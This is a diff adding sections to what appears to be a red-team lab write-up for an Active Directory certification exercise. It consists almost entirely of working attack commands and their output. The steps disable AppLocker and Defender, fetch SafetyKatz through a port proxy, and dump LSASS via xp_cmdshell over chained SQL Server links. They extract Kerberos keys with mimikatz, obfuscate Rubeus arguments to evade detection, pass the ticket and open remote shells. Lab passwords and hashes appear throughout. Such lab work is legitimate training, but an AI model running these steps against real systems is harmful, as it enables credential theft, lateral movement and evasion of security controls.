+Attempting to start cmd as user "dcorp\student422" ...
+```
+
+![New spawned terminal process 3](./assets/screenshots/learning_objective_07_new_spawned_terminal_process_3.png)
+
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+
+`gpmc.msc`
+
+![Group Policy Management Console - Disable Applocker GPO 1](./assets/screenshots/learning_objective_07_gpmc_disable_applocker_1.png)
+
+![Group Policy Management Console - Disable Applocker GPO 2](./assets/screenshots/learning_objective_07_gpmc_disable_applocker_2.png)
+
+![Group Policy Management Console - Disable Applocker GPO 3](./assets/screenshots/learning_objective_07_gpmc_disable_applocker_3.png)
+
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+
+`winrs -r:dcorp-adminsrv cmd`:
+```
+Microsoft Windows [Version 10.0.20348.2762]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\student422>
+```
+🚀
+
+![dcorp-adminsrv | student422](https://custom-icon-badges.demolab.com/badge/dcorp--adminsrv-student422-64b5f6?logo=windows11&logoColor=white)
+
+`gpupdate /force`:
+```
+Updating policy...
+
+Computer Policy update has completed successfully.
+User Policy update has completed successfully.
+```
+
+`exit`
+
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+
+`echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-adminsrv\C$\Users\Public\Loader.exe`:
+```
+Does \\dcorp-adminsrv\C$\Users\Public\Loader.exe specify a file name
+or directory name on the target
+(F = file, D = directory)? F
+C:\AD\Tools\Loader.exe
+1 File(s) copied
+```
+
+`winrs -r:dcorp-adminsrv cmd`:
+```
+Microsoft Windows [Version 10.0.20348.2762]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\student422>
+```
+🚀
+
+![dcorp-adminsrv | student422](https://custom-icon-badges.demolab.com/badge/dcorp--adminsrv-student422-64b5f6?logo=windows11&logoColor=white)
+
+`netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.22`
+
+`C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"`:
+```
+[SNIP]
+
+mimikatz(commandline) # sekurlsa::evasive-keys
+
+[SNIP]
+
+Authentication Id : 0 ; 136295 (00000000:00021467)
+Session           : Service from 0
+User Name         : appadmin👤
+Domain            : dcorp
+Logon Server      : DCORP-DC
+Logon Time        : 1/16/2025 7:43:13 AM
+SID               : S-1-5-21-719815819-3726368948-3917688648-1117
+
+         * Username : appadmin
+         * Domain   : DOLLARCORP.MONEYCORP.LOCAL🏛️
+         * Password : *ActuallyTheWebServer1
+         * Key List :
+           aes256_hmac       68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb🔑
+           aes128_hmac       449e9900eb0d6ccee8dd9ef66965797e
+           rc4_hmac_nt       d549831a955fee51a43c83efb3928fa7
+           rc4_hmac_old      d549831a955fee51a43c83efb3928fa7
+           rc4_md4           d549831a955fee51a43c83efb3928fa7
+           rc4_hmac_nt_exp   d549831a955fee51a43c83efb3928fa7
+           rc4_hmac_old_exp  d549831a955fee51a43c83efb3928fa7
+
+[SNIP]
+```
+🚩
 
 ---
 
@@ -1861,11 +2537,6 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed
 ```
 🚩
-
-``:
-```
-
-```
 
 #### Domain Privilege Escalation | Unconstrained Delegation Abuse + Coercion + DCSync (with PowerView, Rubeus, Find-PSRemotingLocalAdminAccess, MS-RPRN, SafetyKatz)
 
@@ -5162,6 +5833,326 @@ SYSTEM👤
 ```
 EU-SQL26🖥️
 ```
+🚩
+
+#### Cross Trust Attacks | SQL Server Links Abuse + Credential Extraction (OPSEC) (with PowerUpSQL, FindLSASSPID, minidumpdotnet, mimikatz, Rubeus, WSManWinRM)
+
+![`studentshare422` SMB share 1](./assets/screenshots/learning_objective_23_smbshare_1.png)
+
+![`studentshare422` SMB share 2](./assets/screenshots/learning_objective_23_smbshare_2.png)
+
+![Enable `Guest` local user 1](./assets/screenshots/learning_objective_23_enable_guest_1.png)
+
+![Enable `Guest` local user 2](./assets/screenshots/learning_objective_23_enable_guest_2.png)
+
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+
+`hostname`:
+```
+dcorp-std422🖥️
+```
+
+`copy C:\AD\Tools\minidumpdotnet.exe \\dcorp-std422\studentshare422`
+
+`copy C:\AD\Tools\FindLSASSPID.exe \\dcorp-std422\studentshare422`
+
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+
+`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
+```
+[SNIP]
+```
+
+`Import-Module C:\AD\Tools\PowerUpSQL-master\PowerUpSQL.psd1`
+
+`Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''\\dcorp-std422.dollarcorp.moneycorp.local\studentshare422\FindLSASSPID.exe''' -QueryTarget eu-sql26`:
+```
+[SNIP]
+
+Version     : SQL Server 2019
+Instance    : DCORP-MSSQL
+CustomQuery :
+Sysadmin    : 0
+Path        : {DCORP-MSSQL}
+User        : dcorp\student422
+Links       : {DCORP-SQL1}
+
+Version     : SQL Server 2019
+Instance    : DCORP-SQL1
+CustomQuery :
+Sysadmin    : 0
+Path        : {DCORP-MSSQL, DCORP-SQL1}
+User        : dblinkuser
+Links       : {DCORP-MGMT}
+
+Version     : SQL Server 2019
+Instance    : DCORP-MGMT
+CustomQuery :
+Sysadmin    : 0
+Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT}
+User        : sqluser
+Links       : {EU-SQL26.EU.EUROCORP.LOCAL}
+
+Version     : SQL Server 2019
+Instance    : EU-SQL26🖥️
+CustomQuery : {[+] LSASS PID: 708📌, }
+Sysadmin    : 1
+Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT, EU-SQL26.EU.EUROCORP.LOCAL}
+User        : sa👤
+Links       :
+
+[SNIP]
+```
+
+`Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'SELECT @@version' -QueryTarget eu-sql26`:
+```
+[SNIP]
+```
+
+`Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''\\dcorp-std422.dollarcorp.moneycorp.local\studentshare422\minidumpdotnet.exe 708 \\dcorp-std422.dollarcorp.moneycorp.local\studentshare422\monkey422.dmp''' -QueryTarget eu-sql26`:
+```
+[SNIP]
+
+Version     : SQL Server 2019
+Instance    : EU-SQL26
+CustomQuery : 📌
+Sysadmin    : 1
+Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT, EU-SQL26.EU.EUROCORP.LOCAL}
+User        : sa
+Links       :
+```
+
+`dir C:\AD\Tools\studentshare422\monkey422.dmp`:
+```
+ Volume in drive C has no label.
+ Volume Serial Number is 1A5A-FDE2
+
+ Directory of C:\AD\Tools\studentshare422
+
+02/18/2025  06:25 AM        10,461,130 monkey422.dmp
+               1 File(s)     10,461,130 bytes📌
+               0 Dir(s)   9,726,033,920 bytes free
+```
+
+`Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'SELECT * FROM master.dbo.sysdatabases' -QueryTarget eu-sql26`:
+```
+[SNIP]
+```
+
+![Run as administrator](./assets/screenshots/learning_objectives_run_as_administrator.png)
+
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+
+`cd \AD\Tools`
+
+`C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat`:
+```
+[SNIP]
+```
+
+`C:\AD\Tools\mimikatz.exe "sekurlsa::minidump C:\AD\Tools\studentshare422\monkey422.dmp" "sekurlsa::ekeys" "exit"`:
+```
+Program 'mimikatz.exe' failed to run: Access is deniedAt line:1 char:1
++ C:\AD\Tools\mimikatz.exe "sekurlsa::minidump C:\AD\Tools\studentshare ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~.
+At line:1 char:1
++ C:\AD\Tools\mimikatz.exe "sekurlsa::minidump C:\AD\Tools\studentshare ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
+    + FullyQualifiedErrorId : NativeCommandFailed
+```
+❌
+
+![Windows Defender real-time protection turn off](./assets/screenshots/learning_objectives_windows_defender_turnoff.png)
+
+`C:\AD\Tools\mimikatz.exe "sekurlsa::minidump C:\AD\Tools\studentshare422\monkey422.dmp" "sekurlsa::ekeys" "exit"`:
+```
+[SNIP]
+
+mimikatz(commandline) # sekurlsa::ekeys
+Opening : 'C:\AD\Tools\studentshare422\monkey422.dmp' file for minidump...
+
+Authentication Id : 0 ; 605085 (00000000:00093b9d)
+Session           : RemoteInteractive from 2
+User Name         : dbadmin
+Domain            : EU
+Logon Server      : EU-DC
+Logon Time        : 1/16/2025 8:43:32 AM
+SID               : S-1-5-21-3665721161-1121904292-1901483061-1105
+
+         * Username : dbadmin👤
+         * Domain   : EU.EUROCORP.LOCAL🏛️
+         * Password : (null)
+         * Key List :
+           aes256_hmac       ef21ff273f16d437948ca755d010d5a1571a5bda62a0a372b29c703ab0777d4f🔑
+           rc4_hmac_nt       0553b02b95f64f7a3c27b9029d105c27
+           rc4_hmac_old      0553b02b95f64f7a3c27b9029d105c27
+           rc4_md4           0553b02b95f64f7a3c27b9029d105c27
+           rc4_hmac_nt_exp   0553b02b95f64f7a3c27b9029d105c27
+           rc4_hmac_old_exp  0553b02b95f64f7a3c27b9029d105c27
+
+[SNIP]
+```
+
+![Run as administrator](./assets/screenshots/learning_objectives_run_as_administrator.png)
+
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+
+`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:dbadmin /aes256:ef21ff273f16d437948ca755d010d5a1571a5bda62a0a372b29c703ab0777d4f /domain:eu.eurocorp.local /dc:eu-dc.eu.eurocorp.local /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt`:
+```
+```
+❌
+
+`C:\AD\Tools\ArgSplit.bat`:
+```
+[!] Argument Limit: 180 characters
+[+] Enter a string: asktgt
+set "z=t"
+set "y=g"
+set "x=t"
+set "w=k"
+set "v=s"
+set "u=a"
+set "Pwn=%u%%v%%w%%x%%y%%z%"
+```
+
+```
+set "z=t"
+set "y=g"
+set "x=t"
+set "w=k"
+set "v=s"
+set "u=a"
+set "Pwn=%u%%v%%w%%x%%y%%z%"
+```
+
+`echo %Pwn%`:
+```
+asktgt
+```
+
+`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:dbadmin /aes256:ef21ff273f16d437948ca755d010d5a1571a5bda62a0a372b29c703ab0777d4f /domain:eu.eurocorp.local /dc:eu-dc.eu.eurocorp.local /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt`:
+```
+[SNIP]
+
+[*] Action: Ask TGT📌
+
+[*] Showing process : True
+[*] Username        : LBGW5X5K
+[*] Domain          : QPXO1AN5
+[*] Password        : AE4IT2R8
+[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
+[+] ProcessID       : 5944
+[+] LUID            : 0x4a6c68
+
+[*] Using domain controller: eu-dc.eu.eurocorp.local (172.16.15.2)
+[!] Pre-Authentication required!
+[!]     AES256 Salt: EU.EUROCORP.LOCALdbadmin
+[*] Using aes256_cts_hmac_sha1 hash: ef21ff273f16d437948ca755d010d5a1571a5bda62a0a372b29c703ab0777d4f
+[*] Building AS-REQ (w/ preauth) for: 'eu.eurocorp.local\dbadmin'
+[*] Target LUID : 4877416
+[*] Using domain controller: 172.16.15.2:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+[SNIP]
+
+[*] Target LUID: 0x4a6c68
+[+] Ticket successfully imported!🎟️
+
+  ServiceName              :  krbtgt📌/EU.EUROCORP.LOCAL
+  ServiceRealm             :  EU.EUROCORP.LOCAL
+  UserName                 :  dbadmin🎭 (NT_PRINCIPAL)
+  UserRealm                :  EU.EUROCORP.LOCAL🏛️
+  StartTime                :  2/18/2025 8:02:16 AM
+  EndTime                  :  2/18/2025 6:02:16 PM
+  RenewTill                :  2/25/2025 8:02:16 AM
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType                  :  aes256_cts_hmac_sha1
+  Base64(key)              :  gKp83znHtcMMyAmddkiUOAtiiiNRRADOj57zqhzAaxg=
+  ASREP (key)              :  EF21FF273F16D437948CA755D010D5A1571A5BDA62A0A372B29C703AB0777D4F
+```
+
+![New spawned terminal process](./assets/screenshots/learning_objective_23_new_spawned_terminal_process.png)
+
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+
+`klist`:
+```
+Current LogonId is 0:0x4a6c68
+
+Cached Tickets: (1)
+
+#0>     Client: dbadmin🎭 @ EU.EUROCORP.LOCAL🏛️
+        Server: krbtgt📌/EU.EUROCORP.LOCAL @ EU.EUROCORP.LOCAL
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
+        Start Time: 2/18/2025 8:02:16 (local)
+        End Time:   2/18/2025 18:02:16 (local)
+        Renew Time: 2/25/2025 8:02:16 (local)
+        Session Key Type: AES-256-CTS-HMAC-SHA1-96
+        Cache Flags: 0x1 -> PRIMARY
+        Kdc Called:
+```
+
+`winrs -r:eu-sql26.eu.eurocorp.local cmd`:
+```
+Microsoft Windows [Version 10.0.20348.2762]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\dbadmin>
+```
+🚀
+
+![eu-sql26 | dbadmin](https://custom-icon-badges.demolab.com/badge/eu--sql26-dbadmin-64b5f6?logo=windows11&logoColor=white)
+
+`set username`:
+```
+USERNAME=dbadmin👤
+```
+🚩
+
+`exit`
+
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+
+`klist`:
+```
+Current LogonId is 0:0x4a6c68
+
+Cached Tickets: (1)
+
+#0>     Client: dbadmin🎭 @ EU.EUROCORP.LOCAL🏛️
+        Server: krbtgt📌/EU.EUROCORP.LOCAL @ EU.EUROCORP.LOCAL
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
+        Start Time: 2/18/2025 8:02:16 (local)
+        End Time:   2/18/2025 18:02:16 (local)
+        Renew Time: 2/25/2025 8:02:16 (local)
+        Session Key Type: AES-256-CTS-HMAC-SHA1-96
+        Cache Flags: 0x1 -> PRIMARY
+        Kdc Called:
+```
+
+`C:\AD\Tools\WSManWinRM.exe eu-sql26.eu.eurocorp.local "cmd /c set username C:\Windows\ccmcache\"`:
+```
+[*] Creating session with the remote system...
+[*] Connected to the remote WinRM system
+[*] Result Code: 000001B9CDEFB078
+
+[ctrl+c]
+```
+❌
+
+`C:\AD\Tools\WSManWinRM.exe eu-sql26.eu.eurocorp.local "cmd /c dir >> \\dcorp-std422.dollarcorp.moneycorp.local\studentshare422\out.txt C:\Windows\ccmcache\"`:
+```
+[*] Creating session with the remote system...
+[*] Connected to the remote WinRM system
+[*] Result Code: 000001B9CDEFB078
+
+[ctrl+c]
+```
+❌
 🚩
 
 ---
